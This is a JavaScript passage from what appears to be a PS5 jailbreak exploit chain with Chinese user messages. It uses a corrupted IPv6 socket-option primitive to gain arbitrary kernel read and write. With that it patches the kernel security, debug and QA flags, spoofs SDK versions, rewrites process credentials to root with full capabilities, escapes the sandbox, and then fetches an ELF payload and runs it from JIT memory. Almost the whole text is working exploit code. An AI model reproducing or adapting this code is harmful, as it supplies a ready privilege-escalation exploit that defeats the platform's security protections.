        await chain.add_syscall(SYSCALL_GETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, read_buf_store, pktinfo_size_store);
        await chain.run();
        let file_addr = p.read8(read_buf_store).add32(0x00);
        chain.push_write8(write_victim_buf_store.add32(0x00), file_addr.add32(0x00));
        chain.push_write8(write_victim_buf_store.add32(0x08), 0);
        chain.push_write4(write_victim_buf_store.add32(0x10), 0);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_victim_buf_store, 0x14);
        await chain.add_syscall(SYSCALL_GETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, read_buf_store, pktinfo_size_store);
        await chain.run();
        let sock_addr = p.read8(read_buf_store).add32(0x00);
        chain.push_write8(write_victim_buf_store.add32(0x00), sock_addr);
        chain.push_write8(write_victim_buf_store.add32(0x08), 0);
        chain.push_write4(write_victim_buf_store.add32(0x10), 0);
        chain.push_write4(write_buf_store.add32(0x00), 0x100);
        chain.push_write4(write_buf_store.add32(0x04), 0x2);
        chain.push_write8(write_buf_store.add32(0x08), 0);
        chain.push_write4(write_buf_store.add32(0x0C), 0);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_victim_buf_store, 0x14);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_buf_store, 0x14);
        await chain.run();
    }
    await inc_socket_refcount(overlap_sock);
    await inc_socket_refcount(master_sock);
    await inc_socket_refcount(victim_sock);
    log("[+] sock cleanUP");
    let pipe_filedescent = await ofiles_addr.add32(pipe_read * 0x30);
    await kread(await pipe_filedescent.add32(0x00));
    let pipe_file = await p.read8(read_buf_store);
    await kread(await pipe_file.add32(0x00));
    let pipe_addr = await p.read8(read_buf_store);
    let copyout = async function(dest, source, length) {
        if (typeof copyout.value == 'undefined') {
            copyout.value0 = new int64(0x40000000, 0x40000000);
            copyout.value1 = new int64(0x00000000, 0x40000000);
        }
        chain.push_write8(write_victim_buf_store.add32(0x00), pipe_addr.add32(0x00));
        chain.push_write8(write_victim_buf_store.add32(0x08), 0);
        chain.push_write4(write_victim_buf_store.add32(0x10), 0);
        chain.push_write8(write_buf_store.add32(0x00), copyout.value0);
        chain.push_write8(write_buf_store.add32(0x08), copyout.value1);
        chain.push_write4(write_buf_store.add32(0x10), 0);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_victim_buf_store, 0x14);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_buf_store, 0x14);
        chain.push_write8(write_victim_buf_store.add32(0x00), pipe_addr.add32(0x10));
        chain.push_write8(write_victim_buf_store.add32(0x08), 0);
        chain.push_write4(write_victim_buf_store.add32(0x10), 0);
        chain.push_write8(write_buf_store.add32(0x00), source);
        chain.push_write8(write_buf_store.add32(0x08), 0);
        chain.push_write4(write_buf_store.add32(0x10), 0);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_victim_buf_store, 0x14);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_buf_store, 0x14);
        await chain.add_syscall(SYSCALL_READ, pipe_read, dest, length);
        await chain.run();
    }
    let copyin = async function(dest, source, length) {
        if (typeof copyin.value == 'undefined') {
            copyin.value = new int64(0x00000000, 0x40000000);
        }
        chain.push_write8(write_victim_buf_store.add32(0x00), pipe_addr.add32(0x00));
        chain.push_write8(write_victim_buf_store.add32(0x08), 0);
        chain.push_write4(write_victim_buf_store.add32(0x10), 0);
        chain.push_write8(write_buf_store.add32(0x00), 0);
        chain.push_write8(write_buf_store.add32(0x08), copyin.value);
        chain.push_write4(write_buf_store.add32(0x10), 0);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_victim_buf_store, 0x14);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_buf_store, 0x14);
        chain.push_write8(write_victim_buf_store.add32(0x00), pipe_addr.add32(0x10));
        chain.push_write8(write_victim_buf_store.add32(0x08), 0);
        chain.push_write4(write_victim_buf_store.add32(0x10), 0);
        chain.push_write8(write_buf_store.add32(0x00), dest);
        chain.push_write8(write_buf_store.add32(0x08), 0);
        chain.push_write4(write_buf_store.add32(0x10), 0);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, master_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_victim_buf_store, 0x14);
        await chain.add_syscall(SYSCALL_SETSOCKOPT, victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, write_buf_store, 0x14);
        await chain.add_syscall(SYSCALL_WRITE, pipe_write, source, length);
        await chain.run();
    }
    await kread(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_SECURITYFLAGS));
    let security_flags = p.read4(read_buf_store);
    security_flags |= 0x14;
    p.write4(read_buf_store, security_flags);
    await copyin(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_SECURITYFLAGS), read_buf_store, 0x4);

    await kread(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_PS4SDK));
    let ps4sdk = p.read4(read_buf_store);
    ps4sdk = 0x99999999;  // max ps4sdk version
    p.write4(read_buf_store, ps4sdk);

    await copyin(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_PS4SDK), read_buf_store, 0x4);
    log("[+] Enabled PS4 SDK Verison Spoofing");
    

    await kread(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_PS5SDK));
    let ps5sdk = p.read4(read_buf_store);
    ps5sdk = 0x99999999;  // max ps5sdk version
    p.write4(read_buf_store, ps5sdk);

    await copyin(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_PS5SDK), read_buf_store, 0x4);
    log("[+] Enabled PS5 SDK Verison Spoofing");


    await kread(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_TARGETID));
    let target_id = p.read1(read_buf_store);
    target_id = 0x82;
    p.write1(read_buf_store, target_id);
    await copyin(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_TARGETID), read_buf_store, 0x10);
    await kread(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_QA_FLAGS));
    let word1 = p.read2(read_buf_store.add32(0x1));
    word1 |= 0x103;
    p.write2(read_buf_store.add32(0x1), word1);
    await copyin(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_QA_FLAGS), read_buf_store, 0x10);
    await kread(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_UTOKEN_FLAGS));
    let byte1 = p.read1(read_buf_store);
    byte1 |= 0x1;
    p.write1(read_buf_store, byte1);
    await copyin(data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_UTOKEN_FLAGS), read_buf_store, 0x10);
    log("[+] Enabled debug settings");
    let rootvnode_area_store = p.malloc(0x100);
    let uid_store     = p.malloc(0x4);
    let ngroups_store = p.malloc(0x4);
    let authid_store  = p.malloc(0x8);
    let caps_store    = p.malloc(0x8);
    let attr_store    = p.malloc(0x8);
    log("[+] 即将自动注入...");
    await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\x65\xCD\x1D\0\0\0\0"));
    await chain.run();
    
    await copyout(rootvnode_area_store, await data_base_addr.add32(OFFSET_KERNEL_DATA_BASE_ROOTVNODE), 0x100);

    await p.write4(uid_store, 0x0);
    await p.write4(ngroups_store, 0x1);
    await p.write8(authid_store, new int64(0x00000013, 0x48010000));
    await p.write8(caps_store, new int64(0xffffffff, 0xffffffff));
    await p.write1(attr_store, 0x80);
    await copyin(proc_ucred_addr.add32(0x04), uid_store, 0x4);
    await copyin(proc_ucred_addr.add32(0x08), uid_store, 0x4);
    await copyin(proc_ucred_addr.add32(0x0C), uid_store, 0x4);
    await copyin(proc_ucred_addr.add32(0x10), ngroups_store, 0x4);
    await copyin(proc_ucred_addr.add32(0x14), uid_store, 0x4);
    await copyin(proc_fd_addr.add32(0x10), rootvnode_area_store, 0x8);
    await copyin(proc_fd_addr.add32(0x18), rootvnode_area_store, 0x8);
    await copyin(proc_ucred_addr.add32(0x58), authid_store, 0x8);
    await copyin(proc_ucred_addr.add32(0x60), caps_store, 0x8);
    await copyin(proc_ucred_addr.add32(0x68), caps_store, 0x8);
    await copyin(proc_ucred_addr.add32(0x83), attr_store, 0x1);
    let restrict_flags_addr_store = p.malloc(0x8);
    let restrict_flags_store = p.malloc(0x4);
    await p.write4(restrict_flags_store, 0x0);
    await copyout(restrict_flags_addr_store, await cur_proc_addr.add32(0x3E8), 0x8);
    let restrict_flags_addr =  await p.read8(restrict_flags_addr_store).add32(0x118);
    await copyin(restrict_flags_addr, restrict_flags_store, 0x4);
    let libkern_ref_store = p.malloc(0x8);
    await p.write8(libkern_ref_store, 0x1);
    let dyn_libkernel_addr = await p.read8(restrict_flags_addr_store).add32(0x18);
    await copyin(dyn_libkernel_addr, libkern_ref_store, 0x8);
    await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\x65\xCD\x1D\0\0\0\0"));
    await chain.run();
    await chain.add_syscall_ret(scratch_store, 0x018);
    await chain.run();
    // await sleep(100);
    log("[+] Patched creds, checking uid = 0x" + p.read4(scratch_store).toString(16));
    for (let i = 0; i < NUM_SPRAY_SOCKS; i++) {
        let spray_fd = p.read4(spray_fds_store.add32(i * 0x4));
        if (spray_fd != victim_sock) {
            await chain.add_syscall(SYSCALL_CLOSE, spray_fd);
        }
    }
    await chain.run();
    for (let i = 0; i < SPRAY_SIZE_KQUEUES; i++) {
        let kq_fd = p.read4(kqueue_fds_store.add32(i * 0x4));
        await chain.add_syscall(SYSCALL_CLOSE, kq_fd);
    }
    await chain.run();
    var payloadname = document.getElementById("onekey").value;
    log("[+] Launching ELF loader... loading "+payloadname);
    const response = await fetch(payloadname);
    if (!response.ok) {
        throw new Error(`Failed to fetch the binary file. Status: ${response.status}`);
    }
    log("===== Stage 6 - ELF Loader =====");
    let dlsym_addr = syscalls[SYSCALL_DYNLIB_DLSYM];
    let jit_handle_store = p.malloc(0x4);

    // ELF sizes and offsets
    let SIZE_ELF_HEADER                 = 0x40;
    let SIZE_ELF_PROGRAM_HEADER         = 0x38;
    let OFFSET_ELF_HEADER_ENTRY         = 0x18;
    let OFFSET_ELF_HEADER_PHOFF         = 0x20;
    let OFFSET_ELF_HEADER_PHNUM         = 0x38;
    let OFFSET_PROGRAM_HEADER_TYPE      = 0x00;
    let OFFSET_PROGRAM_HEADER_FLAGS     = 0x04;
    let OFFSET_PROGRAM_HEADER_OFFSET    = 0x08;
    let OFFSET_PROGRAM_HEADER_VADDR     = 0x10;
    let OFFSET_PROGRAM_HEADER_MEMSZ     = 0x28;
    let OFFSET_PROGRAM_HEADER_FILESZ    = 0x20;
    let ELF_PT_LOAD                     = 0x01;

    let conn_ret_store                  = p.malloc(0x8);
    let elf_store_size                  = SIZE_ELF_HEADER + (SIZE_ELF_PROGRAM_HEADER * 0x10) + 0x200000;
    let elf_store                       = p.malloc(elf_store_size);
    let shadow_mapping_addr = new int64(0x20100000, 0x00000009);
    let mapping_addr        = new int64(0x26100000, 0x00000009);
    let elf_program_headers_offset  = 0;
    let elf_program_headers_num     = 0;
    let ADD_NOTI = await document.getElementById("add_noti").value

    // log("[+] ADD_NOTI: " + ADD_NOTI);
    window.msgs.innerText='正在加载 Kstuff/etaHen\n请等待左上角跳窗, 会卡一下';
    const data = await response.arrayBuffer();
    const byteArray = new Uint8Array(data);
    for (let i = 0; i < byteArray.length; i++){
        if(ADD_NOTI!=1 && i==168225){
            p.write1(await elf_store.add32(i), 0);
        }
        else{
            p.write1(await elf_store.add32(i), byteArray[i]);
        }   
    }
    elf_program_headers_offset = p.read4(await elf_store.add32(OFFSET_ELF_HEADER_PHOFF));
    elf_program_headers_num = p.read4(await elf_store.add32(OFFSET_ELF_HEADER_PHNUM)) & 0xFFFF;
    elf_entry_point = p.read4(await elf_store.add32(OFFSET_ELF_HEADER_ENTRY));
    if (elf_program_headers_offset != 0x40) {
        log("[!] ELF header malformed, terminating connection. "+hex(elf_program_headers_offset));
        window.msgs.innerText='失败, 请 重启再试.';
        return;
    }
    log("[+] payload got len:" + byteArray.length);

    let shadow_write_mapping = 0;
    for (let i = 0; i < elf_program_headers_num; i++) {
        let program_header_offset = elf_program_headers_offset + (i * SIZE_ELF_PROGRAM_HEADER);
        let program_type   = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_TYPE));
        let program_flags  = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_FLAGS));
        let program_offset = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_OFFSET));
        let program_vaddr  = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_VADDR));
        let program_memsz  = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_MEMSZ));
        let program_filesz  = p.read4(elf_store.add32(program_header_offset + OFFSET_PROGRAM_HEADER_FILESZ));
        let aligned_memsz  = (program_memsz + 0x3FFF) & 0xFFFFC000;
        if (program_type == ELF_PT_LOAD) {
            if ((program_flags & 1) == 1) {
                log("[+] (program_flags & 1) == 1");
                // text_segment_sz = program_memsz;
                await chain.add_syscall_ret(jit_handle_store, SYSCALL_JITSHM_CREATE, 0x0, aligned_memsz, 0x7);
                await chain.run();
                let exec_handle = p.read4(jit_handle_store);
                await chain.add_syscall_ret(jit_handle_store, SYSCALL_JITSHM_ALIAS, exec_handle, 0x3);
                await chain.run();
                let write_handle = p.read4(jit_handle_store);
                await chain.add_syscall_ret(conn_ret_store, SYSCALL_MMAP, shadow_mapping_addr, aligned_memsz, 0x3, 0x11, write_handle, 0);
                await chain.run();
                shadow_write_mapping = p.read8(conn_ret_store);
                let dest = p.read8(conn_ret_store);
                for (let j = 0; j < program_memsz; j += 0x8) {
                    // let src_qword = p.read8(elf_store.add32(program_offset + j));
                    p.write8(dest.add32(j), (j>program_filesz)?0:await p.read8(await elf_store.add32(program_offset + j)));
                }
                await chain.add_syscall_ret(conn_ret_store, SYSCALL_MMAP, await mapping_addr.add32(program_vaddr), aligned_memsz, 0x5, 0x11, exec_handle, 0);
                await chain.run();
            }
            else {
                log("[+] (program_flags & 1) != 1");
                data_mapping_addr = await mapping_addr.add32(program_vaddr);
                await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\xE1\xF5\x05\0\0\0\0"));
                await chain.run();
                await chain.add_syscall_ret(conn_ret_store, SYSCALL_MMAP, await mapping_addr.add32(program_vaddr), aligned_memsz, 0x3, 0x1012, 0xFFFFFFFF, 0);
                await chain.run();
                log("[+] get mapping ");
                let dest = mapping_addr.add32(program_vaddr);

                for (let j = 0; j < program_memsz; j += 0x8) {
                    // let src_qword = p.read8(elf_store.add32(program_offset + j));
                    p.write8(dest.add32(j), p.read8(await elf_store.add32(program_offset + j)));
                    // p.write8(await dest.add32(j), (j>program_filesz)?0:await p.read8(await elf_store.add32(program_offset + j)));
                }
                log("[+] mapping done");
            }

        }

    }

    let rwpair_mem              = p.malloc(0x8);
    let test_payload_store      = p.malloc(0x8);
    let pthread_handle_store    = p.malloc(0x8);
    let pthread_value_store     = p.malloc(0x8);
    let args                    = p.malloc(0x8 * 6);

    p.write8(rwpair_mem, 0);
    p.write8(rwpair_mem.add32(0x4), 0);
    p.write8(test_payload_store, 0);
    p.write8(pthread_handle_store, 0);
    p.write8(pthread_value_store, 0);
    for (let i = 0; i < 0x8 * 6; i++) {
        p.write1(args.add32(i), 0);
    }
    p.write4(rwpair_mem.add32(0x00), master_sock);
    p.write4(rwpair_mem.add32(0x04), victim_sock);
    p.write8(args.add32(0x00), dlsym_addr);
    p.write8(args.add32(0x08), pipe_mem);
    p.write8(args.add32(0x10), rwpair_mem);
    p.write8(args.add32(0x18), pipe_addr);
    p.write8(args.add32(0x20), data_base_addr);
    p.write8(args.add32(0x28), test_payload_store);
    // Execute payload in pthread
    await log("  [+] Executing!");
    await chain.call(await libKernelBase.add32(OFFSET_lk_pthread_create_name_np), pthread_handle_store, 0x0, await mapping_addr.add32(elf_entry_point), args, p.stringify("payload"));
    // await sleep(500);
    await chain.add_syscall(SYSCALL_NANOSLEEP, p.stringify("\0\0\0\0\0\0\0\0\x00\x65\xCD\x1D\0\0\0\0"));
    await chain.run();
    // Join pthread and wait until we're finished executing
    await chain.call(await libKernelBase.add32(OFFSET_lk_pthread_join), await p.read8(pthread_handle_store), pthread_value_store);
    await log("  [+] Finished, out = 0x" + p.read8(test_payload_store).toString(16));
    blockjb("折腾完成!!!\n 请勿重复折腾, 会断电.",1);
    await log("[+] Done.");
	//---------------
	document.getElementById("loader").style.display = "none";
	await log("PSGO全自动折腾完成！<br/><br/>Debug菜单已激活，现在可以运行和安装PKG ✓<br/>已开启高版本伪装，用于安装运行高版本补丁 ✓<br/><br/>长按PS键回到桌面开始玩耍！");
}
async function run_hax() {
    try{
        await userland();
    }
    catch(error){
        log(error);
        log("[!!!!!!!!] exception error. retry to exec JB.");
        window.msgs.innerText = "意外的错误\n 请重启再试";
    }
}


